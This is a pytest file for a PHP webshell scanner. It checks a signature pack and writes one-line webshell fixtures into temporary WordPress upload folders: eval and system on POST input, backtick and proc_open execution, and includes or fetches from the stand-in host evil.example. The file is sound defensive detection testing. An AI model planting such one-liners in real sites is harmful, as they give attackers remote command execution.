from __future__ import annotations

from pathlib import Path

import pytest

from app.services import host_engine, host_path
from app.services.host_engine import load_signature_pack, scan_local_root


def test_load_signature_pack_has_webshell_rule():
    pack = load_signature_pack()
    ids = {str(r["rule_id"]) for r in pack}
    assert "sinexis.php.eval_post" in ids
    assert "sinexis.php.system_get" in ids
    assert "sinexis.php.adminer" in ids
    assert "sinexis.php.filesman" in ids
    assert "sinexis.php.http_dropper" in ids
    assert "sinexis.php.assert_input" in ids
    assert "sinexis.php.preg_replace_e" in ids
    assert "sinexis.php.create_function" in ids
    assert "sinexis.php.eval_b64" in ids
    assert "sinexis.php.gzinflate_b64" in ids
    assert "sinexis.php.str_rot13_input" in ids
    assert "sinexis.php.include_http" in ids
    assert "sinexis.php.backtick_input" in ids
    assert "sinexis.php.proc_open_input" in ids
    assert "sinexis.php.exec_input" in ids
    assert "sinexis.php.system_post" in ids
    assert "sinexis.php.unserialize_input" in ids
    assert "sinexis.php.file_put_input" in ids
    assert "sinexis.php.move_uploaded" in ids
    assert "sinexis.php.eval_files" in ids


def test_scan_local_root_matches_eval_post(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(host_path, "ALLOWED_PREFIXES", (str(tmp_path),))
    monkeypatch.setattr(host_engine, "validate_root_path", lambda p: str(Path(p)))
    monkeypatch.setattr(host_engine, "jail_rel_path", lambda root, rel: str(Path(root) / rel))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "cache.php").write_text("<?php eval($_POST['x']); ?>", encoding="utf-8")
    (uploads / "clean.php").write_text("<?php echo 1; ?>", encoding="utf-8")
    hits = scan_local_root(str(tmp_path))
    assert any(h["rel_path"].endswith("cache.php") and h["rule_id"] == "sinexis.php.eval_post" for h in hits)
    assert not any(h["rel_path"].endswith("clean.php") for h in hits)


def test_scan_local_root_matches_adminer_and_dropper(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(host_path, "ALLOWED_PREFIXES", (str(tmp_path),))
    monkeypatch.setattr(host_engine, "validate_root_path", lambda p: str(Path(p)))
    monkeypatch.setattr(host_engine, "jail_rel_path", lambda root, rel: str(Path(root) / rel))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "db.php").write_text("<?php /* Software: Adminer */ ?>", encoding="utf-8")
    (uploads / "dl.php").write_text("<?php file_get_contents('http://evil.example/x'); ?>", encoding="utf-8")
    (uploads / "fm.php").write_text("<?php echo 'FilesMan'; ?>", encoding="utf-8")
    hits = scan_local_root(str(tmp_path))
    ids = {(h["rel_path"].split("/")[-1], h["rule_id"]) for h in hits}
    assert ("db.php", "sinexis.php.adminer") in ids
    assert ("dl.php", "sinexis.php.http_dropper") in ids
    assert ("fm.php", "sinexis.php.filesman") in ids


def test_scan_local_root_matches_assert_preg_create(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(host_path, "ALLOWED_PREFIXES", (str(tmp_path),))
    monkeypatch.setattr(host_engine, "validate_root_path", lambda p: str(Path(p)))
    monkeypatch.setattr(host_engine, "jail_rel_path", lambda root, rel: str(Path(root) / rel))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "a.php").write_text("<?php assert($_POST['x']); ?>", encoding="utf-8")
    (uploads / "p.php").write_text("<?php preg_replace('/.*/e', $_POST['x']); ?>", encoding="utf-8")
    (uploads / "c.php").write_text("<?php create_function($_GET['x']); ?>", encoding="utf-8")
    (uploads / "clean.php").write_text("<?php echo 1; ?>", encoding="utf-8")
    hits = scan_local_root(str(tmp_path))
    ids = {(h["rel_path"].split("/")[-1], h["rule_id"]) for h in hits}
    assert ("a.php", "sinexis.php.assert_input") in ids
    assert ("p.php", "sinexis.php.preg_replace_e") in ids
    assert ("c.php", "sinexis.php.create_function") in ids
    assert not any(h["rel_path"].endswith("clean.php") for h in hits)


def test_scan_local_root_matches_obfuscation(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(host_path, "ALLOWED_PREFIXES", (str(tmp_path),))
    monkeypatch.setattr(host_engine, "validate_root_path", lambda p: str(Path(p)))
    monkeypatch.setattr(host_engine, "jail_rel_path", lambda root, rel: str(Path(root) / rel))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "e.php").write_text("<?php eval(base64_decode($_POST['x'])); ?>", encoding="utf-8")
    (uploads / "g.php").write_text("<?php gzinflate(base64_decode('x')); ?>", encoding="utf-8")
    (uploads / "r.php").write_text("<?php str_rot13($_GET['x']); ?>", encoding="utf-8")
    (uploads / "clean.php").write_text("<?php echo 1; ?>", encoding="utf-8")
    hits = scan_local_root(str(tmp_path))
    ids = {(h["rel_path"].split("/")[-1], h["rule_id"]) for h in hits}
    assert ("e.php", "sinexis.php.eval_b64") in ids
    assert ("g.php", "sinexis.php.gzinflate_b64") in ids
    assert ("r.php", "sinexis.php.str_rot13_input") in ids
    assert not any(h["rel_path"].endswith("clean.php") for h in hits)


def test_scan_local_root_matches_include_backtick_proc(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(host_path, "ALLOWED_PREFIXES", (str(tmp_path),))
    monkeypatch.setattr(host_engine, "validate_root_path", lambda p: str(Path(p)))
    monkeypatch.setattr(host_engine, "jail_rel_path", lambda root, rel: str(Path(root) / rel))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "i.php").write_text('<?php include("http://evil.example/x"); ?>', encoding="utf-8")
    (uploads / "b.php").write_text("<?php echo `$_GET['c']`; ?>", encoding="utf-8")
    (uploads / "p.php").write_text("<?php proc_open($_POST['c'], [], $p); ?>", encoding="utf-8")
    (uploads / "clean.php").write_text("<?php echo 1; ?>", encoding="utf-8")
    hits = scan_local_root(str(tmp_path))
    ids = {(h["rel_path"].split("/")[-1], h["rule_id"]) for h in hits}
    assert ("i.php", "sinexis.php.include_http") in ids
    assert ("b.php", "sinexis.php.backtick_input") in ids
    assert ("p.php", "sinexis.php.proc_open_input") in ids
    assert not any(h["rel_path"].endswith("clean.php") for h in hits)


def test_scan_local_root_matches_exec_system_unserialize(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(host_path, "ALLOWED_PREFIXES", (str(tmp_path),))
    monkeypatch.setattr(host_engine, "validate_root_path", lambda p: str(Path(p)))
    monkeypatch.setattr(host_engine, "jail_rel_path", lambda root, rel: str(Path(root) / rel))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "e.php").write_text("<?php exec($_GET['c']); ?>", encoding="utf-8")
    (uploads / "s.php").write_text("<?php system($_POST['c']); ?>", encoding="utf-8")
    (uploads / "u.php").write_text("<?php unserialize($_REQUEST['x']); ?>", encoding="utf-8")
    (uploads / "clean.php").write_text("<?php echo 1; ?>", encoding="utf-8")
    hits = scan_local_root(str(tmp_path))
    ids = {(h["rel_path"].split("/")[-1], h["rule_id"]) for h in hits}
    assert ("e.php", "sinexis.php.exec_input") in ids
    assert ("s.php", "sinexis.php.system_post") in ids
    assert ("u.php", "sinexis.php.unserialize_input") in ids
    assert not any(h["rel_path"].endswith("clean.php") for h in hits)


def test_scan_local_root_matches_fileput_upload_evalfiles(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(host_path, "ALLOWED_PREFIXES", (str(tmp_path),))
    monkeypatch.setattr(host_engine, "validate_root_path", lambda p: str(Path(p)))
    monkeypatch.setattr(host_engine, "jail_rel_path", lambda root, rel: str(Path(root) / rel))
    uploads = tmp_path / "wp-content" / "uploads"
    uploads.mkdir(parents=True)
    (uploads / "w.php").write_text("<?php file_put_contents($_POST['f'], $_POST['b']); ?>", encoding="utf-8")
    (uploads / "m.php").write_text("<?php move_uploaded_file($_FILES['f']['tmp_name'], 'x.php'); ?>", encoding="utf-8")
    (uploads / "f.php").write_text("<?php eval($_FILES['x']['tmp_name']); ?>", encoding="utf-8")
    (uploads / "clean.php").write_text("<?php echo 1; ?>", encoding="utf-8")
    hits = scan_local_root(str(tmp_path))
    ids = {(h["rel_path"].split("/")[-1], h["rule_id"]) for h in hits}
    assert ("w.php", "sinexis.php.file_put_input") in ids
    assert ("m.php", "sinexis.php.move_uploaded") in ids
    assert ("f.php", "sinexis.php.eval_files") in ids
    assert not any(h["rel_path"].endswith("clean.php") for h in hits)


def test_scan_local_root_missing_dir_empty():
    assert scan_local_root("/var/www/host-protect-missing-dir-xyz") == []


def test_scan_clam_skips_without_binary(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(host_engine.shutil, "which", lambda _n: None)
    assert host_engine.clam_binary() is None
    assert host_engine.scan_clam("/var/www/html") == []


def test_scan_clam_parses_found(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(host_path, "ALLOWED_PREFIXES", (str(tmp_path),))
    monkeypatch.setattr(host_engine, "validate_root_path", lambda p: str(Path(p)))
    monkeypatch.setattr(host_engine, "jail_rel_path", lambda root, rel: str(Path(root) / rel))
    infected = tmp_path / "eicar.txt"
    infected.write_text("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR", encoding="utf-8")
    monkeypatch.setattr(host_engine, "clam_binary", lambda: "/usr/bin/clamscan")

    class Fake:
        stdout = f"{infected}: Eicar-Test-Signature FOUND\n"

    monkeypatch.setattr(host_engine.subprocess, "run", lambda *_a, **_k: Fake())
    hits = host_engine.scan_clam(str(tmp_path))
    assert len(hits) == 1
    assert hits[0]["rel_path"] == "eicar.txt"
    assert hits[0]["hit_class"] == "malware"
    assert hits[0]["rule_id"].startswith("clam.")
    assert "sha256" in hits[0]
